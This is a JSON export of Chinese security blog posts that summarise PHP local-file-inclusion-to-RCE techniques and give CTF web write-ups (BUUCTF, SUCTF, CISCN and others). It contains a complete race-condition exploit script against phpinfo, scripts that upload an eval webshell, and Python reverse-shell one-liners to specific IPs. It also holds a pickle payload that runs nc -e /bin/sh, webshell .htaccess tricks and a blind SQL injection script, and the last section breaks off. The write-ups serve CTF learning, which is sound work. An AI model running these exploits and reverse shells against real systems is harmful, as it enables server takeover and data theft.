[{"title":"","date":"2021-05-11T07:36:22.284Z","path":"2021/05/11/LFI RCE总结/","text":"LFI RCE总结​ PHP LFI即本地文件包含漏洞，通过包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等达到拿服务器权限的目的。 ​ 比较常用的方法有：PHPINFO()和 PHP7 Segment Fault。他们的基本原理都是向服务器上传生成恶意的临时文件，再对恶意文件进行包含即可RCE。 临时文件文件名 由于临时文件名是由随机函数生成的，我们需要获取正确的文件名，也就是$_FILES[&#39;userfile&#39;][&#39;name&#39;]。 存储目录及命名规律 文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中。 了解不同系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。 linux： 路径 — /tmp/ 命名规则 — /tmp/php[6个随机字符] windows: 路径 — C:/Windows/ C:/Windows/Temp/ 命名规则 — C:/Windows/php[4个随机字符].tmp PHPINFO()漏洞分析当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。 这可以很好的帮助我们寻找文件名，因为phpinfo页面会将当前请求上下文中所有变量都打印出来（包括$_GET，$POST,$FILES)。所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。 测试特性脚本import requests files = { 'file': (\"a.txt\",\"123123\") } url = \"http://172.17.0.1：8080/phpinfo.php\" r = requests.post(url=url, files=files, allow_redirects=False) print(r.text) 利用条件与版本无关，属于PHPINFO自身特性。 利用原理​ 我们先向PHPINFO发送数据包上传文件，在回显中得到临时文件名，到这里是第一个请求。之后发起第二个请求，把得到的临时文件名发送给存在文件包含漏洞的界面去getshell。 ​ 然而当第一个请求结束时，临时文件就已经被删除了。 ​ 所以这里用到条件竞争来实现目的。 ​ 具体流程如下： 参考：https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell。 python exp.py your-ip 8080 100EXP #!/usr/bin/python import sys import threading import socket def setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r \\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r Content-Type: text/plain\\r \\r %s -----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r HTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r HTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r HTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r HTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r Content-Length: %s\\r Host: %s\\r \\r %s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\r User-Agent: Mozilla/4.0\\r Proxy-Connection: Keep-Alive\\r Host: %s\\r \\r \\r \"\"\" return (REQ1, TAG, LFIREQ) def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) < offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =&gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fn counter=0 class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter >= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =&gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256 def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) < 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter >= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join() if __name__==\"__main__\": main() php7 Segment Fault漏洞分析​ 当目标不存在phpinfo,可以利用php7 segment fault特性（CVE-2018-14884）。 ​ php代码中使用php://filter的过滤器strip_tags , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会执行 , 因此POST 的文件会保存在系统的缓存目录下不会被删除，这样的情况下我们只需要知道其文件名就可以包含恶意代码。 利用条件7.0.0 &lt;= PHP Version &lt; 7.0.28 Payload?file=php://filter/string.strip_tags/resource=/etc/passwd​ 这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在upload_tmp_dir所指定的目录下，不会被删除，这样就能达成getshell的目的。 测试环境PHP 7.0.9 TIPS1 通过dir.php查找临时文件。 LINUX exp #python version 2.7 import requests from io import BytesIO import re files = { 'file': BytesIO('&lt;?php eval($_REQUEST[Qftm]);') } url1 = 'http://172.17.0.1:8080/index.php?file=php://filter/string.strip_tags/resource=index.php' r = requests.post(url=url1, files=files, allow_redirects=False) url2 = 'http://172.17.0.1:8080/dir.php?dir=/tmp/' r = requests.get(url2) data = re.search(r\"php[a-zA-Z0-9]{1,}\", r.content).group(0) print \"++++++++++++++++++++++\" print data print \"++++++++++++++++++++++\" url3='http://192.168.68.119/index.php?file=/tmp/'+data data = { 'Qftm':\"system('whoami');\" } r = requests.post(url=url3,data=data) print r.content Win exp #python version 2.7 import requests from io import BytesIO import re files = { 'file': BytesIO('&lt;?php eval($_REQUEST[Qftm]);') } url1 = 'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php' r = requests.post(url=url1, files=files, allow_redirects=False) url2 = 'http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/' r = requests.get(url2) data = re.search(r\"php[a-zA-Z0-9]{1,}\", r.content).group(0) print \"++++++++++++++++++++++\" print data print \"++++++++++++++++++++++\" url3='http://192.168.68.119/web/fi/index.php?file=C:/Windows/'+data+'.tmp' data = { 'Qftm':\"system('whoami');\" } r = requests.post(url=url3,data=data) print r.content TIPS2 在没有dir.php的情况下进行暴力破解。其实就是fuzz啦，就不详细写了。 参考：https://www.freebuf.com/column/235054.html","tags":[]},{"title":"BUUCTF WEB wp3","date":"2021-01-08T00:00:00.000Z","path":"2021/01/08/BUUCTFwp3/","text":"[SUCTF 2019]EasyWeb给了源码。进行审计。 &lt;?php function get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); } } $hhh = @$_GET['_']; if (!$hhh){ highlight_file(__FILE__); } if(strlen($hhh)>18){ //对长度做限制 die('One inch long, one inch strong!'); } if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');//不能有字母数字和一些字符 $character_type = count_chars($hhh, 3); if(strlen($character_type)>12) die(\"Almost there!\");//重复字符不能多于12 eval($hhh); ?> 思路就是调用get_flag(),进而上传shell。 先第一个条件，对字母数字的过滤一般都由异或、取反、自增这三种方式绕过。 但这个过滤了~，那么取反被pass；由于有长度限制，自增也不能用； 因此这里选择用异或。 str_= '_GET' str_=list(str_) final='' for x in str_: print(hex(~ord(x)&amp;0xff)) final+=hex(~ord(x)&amp;0xff) print(str_) final = final.replace('0x','%') final+='^' for x in range(len(str_)): final+=r'%ff' print(final) payload ?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=phpinfo可以看到phpinfo已经被调出来了，那么get_flag函数也可以被调用了。 另外disable_functions中过滤了一大堆函数，这个地方需要注意。看等下是否能bypass。(bypass失败) 看get_flag这里。 function get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); //过滤ph if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\");//过滤&lt;? if(!exif_imagetype($tmp_name)) die(\"^_^\"); //要求图片文件 $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); //打印路径 } } 随便上传一个文件，可以看到上传文件夹是/upload/tmp_…，这里面大概率也不会本身就存在php文件了。所以用.htaccess。 关于.htaccess tricks,参考： https://www.cnblogs.com/20175211lyz/p/11741348.html 对于get_the_flag中的对&lt;?的过滤，由于&lt;script&gt;写法在PHP7后就失效了，而这里是php7.2；这里选择用伪协议读取base64编码后的shell。 //shell.a GIF86A11 //图片头后补两个字符防止base64解析错误 &lt;?php eval($_GET['shell']);?> -------- GIF89a11PD9waHAgZXZhbCgkX0dFVFsnc2hlbGwnXSk7Pz4= 构造.htaccess //绕exif_imagetype() #define test_width 16 #define test_height 7 AddType application/x-httpd-php .a php_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_6ca083a10158bbd1e1d54a1f9ef33813/aaa.a\" 绕exif_imagetype原理： 采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：#define test_width 16#define test_height 7 上传两个文件后，传下phpinfo测试一下。可以正常解析。 但是需要注意的是open_basedir对目录访问做了限制。 参考：bypass open_basedir https://xz.aliyun.com/t/4720 payload chdir(&#39;xxx&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&#39;/&#39;));得到flag文件名。 读flag。 ?shell=chdir(%27aaa%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(readfile(%27/THis_Is_tHe_F14g%27)); [V&amp;N2020 公开赛]CHECKIN进来给了源码，是flask。 from flask import Flask, request import os app = Flask(__name__) flag_file = open(\"flag.txt\", \"r\") # flag = flag_file.read() # flag_file.close() # # @app.route('/flag') # def flag(): # return flag ## want flag? naive! # You will never find the thing you want:) I think @app.route('/shell') def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\" @app.route('/') def source(): return open(\"app.py\",\"r\").read() if __name__ == \"__main__\": app.run(host='0.0.0.0') 主要在shell路由这里。访问/shell时会删除flag.txt，下面给了个shell，但没回显。那就直接反弹shell。 python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.131.185&#39;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&quot;进来了。 虽然文件被删掉了，但进程被存下了。去/proc/pid/fd里找。 手找了半天，看了别人的方法感觉自己好憨。 cat /proc/*/fd/*得到flag [HarekazeCTF2019]encode_and_encode进来是三个跳转界面，点第三个显示源码。（此题前提知道flag在/flag下） &lt;?php error_reporting(0); if (isset($_GET['source'])) { show_source(__FILE__); exit(); } function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true; } $body = file_get_contents('php://input'); //获取post值 $json = json_decode($body, true); //json解码 if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) { //body里不能有非法词 $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) { //读到的内容也不能有非法词 $content = \"&lt;p>not found&lt;/p>\\n\"; } } else { $content = '&lt;p>invalid request&lt;/p>'; } // no data exfiltration!!! $content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content); echo json_encode(['content' => $content]); 有两个地方需要绕过。 $body不能有非法词，但由于是json可以用unicode绕过。 $content里也不能有非法词，那就要考虑去获取已经编码过的内容。正好这里用的是file_get_contents，那就可以用伪协议去读。 $content = file_get_contents($page);payload {&quot;page&quot;:&quot;\\u0070\\u0068\\u0070://filter/convert.base64-decode/resource=/\\u0066\\u006c\\u0061\\u0067&quot;}读到，解码即可。 CISCN-2019-初赛-Love Math进来给了源码 &lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) >= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 对传参的限制： ①八十个字符以内 ②黑名单以下字符 $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; ③将含有字母或‘ _ ’的字段赋值给存入$used_funcs数组，查找其是否在白名单的函数中,不存在就die掉： $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; 满足以上条件则放入eval执行并输出。 首先的想法肯定是通过进制转换然后构造可利用的payload。 思路一 直接执行命令：先看白名单中可以使用的函数： base_convert() 测试后十进制和三十六进制之间的转换是最稳妥的，其他不好说。 hexdec() 由于base_convert函数名过长， 我们将它赋到变量中，变量名选择白名单中函数名最短的，即$pi。 ($pi=base_convert)(1751504350,10,36)(cat f*) 但这个函数并不能转换出像’ * ‘，’ . ‘这样的符号，先用异或构造试试。 本地用bp跑一下 也不行。 但可以用dechex函数把十进制转换为十六进制，再用异或构造一个hex2bin函数将十六进制转为字符串。 初版payload ($pi=base_convert)(1751504350,10,36)($pi(37907361743,10,36)(dechex(426836762666))) 但字符长度还是超了，超了三个。 通过fuzz进制数来缩短，把system换成exec，把cat换成nl。 实际构造 exec(nl /*) 最终payload ($pi=base_convert)(22950,23,34)($pi(1438255411,14,34)(dechex(474260451114))) 思路二 拼接_GET传参c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag[ ]可以用{ }替代 方法一和思路一相似，也是利用进制转换 payload c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flag 方法二简单讲就是把白名单中给的函数与数字异或去构造_GET 脚本 &lt;?php $payload=['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; for($k=1;$k&lt;=sizeof($payload);$k++){ for($i = 0;$i &lt; 9; $i++){ for($j = 0;$j &lt;=9;$j++){ $exp = $payload[$k] ^ $i.$j; echo($payload[$k].\"^$i$j\".\"==>$exp\"); echo \"&lt;br />\"; } } } ?> payload /?c=$pi=(is_nan^(6).(4)).(tanh^(1).(5));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag思路三 利用getallheaders() 因为get_allheaders返回的是数组，可以用arry[‘xxx’]的方式读取数据。 而[]和字母都被waf了，用{}替代[],头名用数字。 payload: $pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))(){100}) 上传头 100 cat /flag 2020-网鼎杯-白虎组-Web-PicDown知识点 /proc/pid/cmdline 包含了用于开始进程的命令 ； /proc/pid/cwd包含了当前进程工作目录的一个链接 ； /proc/pid/environ 包含了可用进程环境变量的列表 ； /proc/pid/exe 包含了正在进程中运行的程序链接； /proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接； /proc/pid/mem 包含了进程在内存中的内容； /proc/pid/stat包含了进程的状态信息； /proc/pid/statm 包含了进程的内存使用信息。 linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。常规操作先扫一波再说。 什么都没有。 网页功能就是传入参数url进行文件读取。 合理怀疑存在任意文件读取或目录穿越。 试试读/etc/passwd 读/proc/self/cmdline文件查看当前进程执行命令，可以看见main.py正在执行 读下源码 #main.py from flask import Flask, Response, render_template, request import os import urllib app = Flask(__name__) SECRET_FILE = \"/tmp/secret.txt\" f = open(SECRET_FILE, 'r') SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route('/') def index(): return render_template('search.html') @app.route('/page') def page(): url = request.args.get(\"url\") try: if not url.lower().startswith(\"file\"): #禁了file伪协议 res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = \"HACK ERROR!\" except Exception as e: print(e) value = \"SOMETHING WRONG!\" return render_template('search.html', res=value) @app.route('/no_one_know_the_manager') def manager(): key = request.args.get(\"key\") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\"shell\") os.system(shell) res = \"ok\" else: res = \"Wrong Key!\" return res if __name__ == '__main__': app.run(host='0.0.0.0', port=80, use_reloader=False) 重点代码在/no_one_know_the_manager路由这 若传入参数key与/tmp/secret.txt中的SECRET_KEY一致，则执行传入的shell参数。 但可以看到 os.remove(SECRET_FILE)执行时，secret.txt已经被删掉了。但它是用open打开的，在打开时会创建文件描述符。 可以从/proc/self/fd读文件内容。 ?url=../../../../../../proc/self/fd/3 传参key和shell,回显ok，但不回显命令执行的结果。进行反弹shell。 payload /no_one_know_the_manager?key=608b8a425ae3a1f6d7e9426582804b8a&amp;shell=python2%20-c%20%20%27import%20socket,subprocess,os;s%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2247.56.176.152%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p%3dsubprocess.call(['/bin/sh','-i'],shell%3dTrue);%27 反弹成功，根目录下读flag。 CISCN-2019-华北赛区-Day2-Web-Web1进来页面就说表和列都给你了，试了一下还存在过滤。 fuzz一下看还有哪些被ban了。 输入1，2有不同的回显 其他数字是这个回显 其他字符是返回布尔false 那应该就是布尔盲注了。 脚本 import requests import time url = 'http://challenge-1a9f9c5c110d52bb.sandbox.ctfhub.com:10080/index.php' headers = { 'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection':'keep-alive' } data={'id' : \"\"} flag=\"\" for i in range (1,50): start=31 end=130 mid= int((start+end)/2) while start&lt;end: print(start,end,mid) #time.sleep(1) data['id'] = \"0^(ascii(substr((select(flag)from(flag)),{0},1))>{1})\".format(i,mid) html = requests.post(url,data=data) if \"Hello\" in html.text: start=mid+1 else: end=mid mid= int((start+end)/2) flag+=chr(mid) print(flag) print(flag)","tags":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://dddwmr.github.io/tags/BUUCTF/"}]},{"title":"BUUCTF WEB wp2","date":"2021-01-07T00:00:00.000Z","path":"2021/01/07/BUUCTFwp2/","text":"[CISCN2019 华北赛区 Day1 Web2]ikun考点：JWT伪造，PYTHON反序列化 点进来是个商店，看这意思是要买lv6的东西。翻了几页找不到lv6。 那写个脚本找找Lv6。 除此之外还有登录注册。随便注册一个用户进来，余额1000。 跑着脚本的期间看看购买的包。两个值得注意的点，一个是JWT,那就意味着可能可以通过伪造JWT登入管理员用户。另一个是传参中的price和discount,可以尝试是否可以通过更改他们改变价格。 这时候脚本也跑出来了，在181页。 抓这个的包，尝试后发现改discount可行。得到新页面/b1g_m4mber 访问，要求admin权限。 那就正好jwt改改。 爆一下密码1Kun。 得到新的JWT。 传入JWT进来了。 进个人中心得到新hint。 解码，说是有后门。 点点成为大会员，抓个包。程序员跑路前留下了源码。 翻翻源码，在Admin.py里发现了序列化 def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) exp import pickle import urllib class A(object): def __reduce__(self): return (eval,(\"__import__('os').popen('ls /').read()\",)) return (eval,(\"__import__('os').popen('cat /flag.txt').read()\",)) a = pickle.dumps(A()) a = urllib.quote(a) print a ---------- payload = c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27ls%20/%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. payload = c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 向become传入payload,得到flag。 [watevrCTF-2019]Pickle Store考点：python反序列化 题目就告诉是pickle了。 进来是一个商店，还是熟悉的钱不够买东西环节。 抓个包看一下。 解一下这里的session，本来想着看能不能改下money，但可以看到这里的anit_tamper_hmac就是为了防止数据被篡改。 再加上没有源码，这里直接选择利用python反序列化反弹shell。 exp import base64 import pickle class A(object): def __reduce__(self): return (eval, (\"__import__('os').system('nc 172.16.188.63 2333 -e/bin/sh')\",)) a = A() print(base64.b64encode(pickle.dumps(a))) 得到payload Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3Mi4xNi4xODguNjMgMjMzMyAtZS9iaW4vc2gnKSIKcDEKdHAyClJwMwoupayload传入session 直接cat flag [BJDCTF 2nd]elementmaster进来看见这个贴图，说自己是元素大师，一共有118种元素。 百度了一下，原来是化学元素。 查看源码，发现两个十六进制字符串。转一下是Po和.php。 访问一下，内容却只有一个. 先试试其他元素的页面有没有回显。 确实是有的，那把这些页面的回显拼起来就可以了。 import requests url='http://acc3a451-dabc-4062-ac0a-b261302de6ac.node3.buuoj.cn/' flag='' dict1=['H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar', 'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr', 'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue'] for i in dict1: urls=url + i + '.php' r=requests.get(urls) print(r.text) if r.status_code == 200: flag+=r.text print(flag) print (flag) 得到页面。 访问得flag。 [GKCTF2020]EZ三剑客-EzWeb考点：gopher攻击redis 进来是一个可以输url的界面，参数是url和submit，功能就是跳转页面。先尝试一下127.0.0.1，回显别这样，应该是存在过滤。考虑是否存在ssrf。 查看源码发现hint。 访问一下。泄露了网卡信息。 读下index.php的源码，测试中发现file被过滤，用file:/ 绕过。 file: /var/www/html/index.php源码如下,过滤了file,dict,127.0.0.1和localhost。 扫一下内网存活主机。 这个主机给了个提示。说是端口有问题。那就接着扫下端口。 扫到6379，redis端口。用Gopherus生成payload。 传payload 访问shell.php,有回显了。 然后直接用ls /,和cat /flag得到flag。 payload 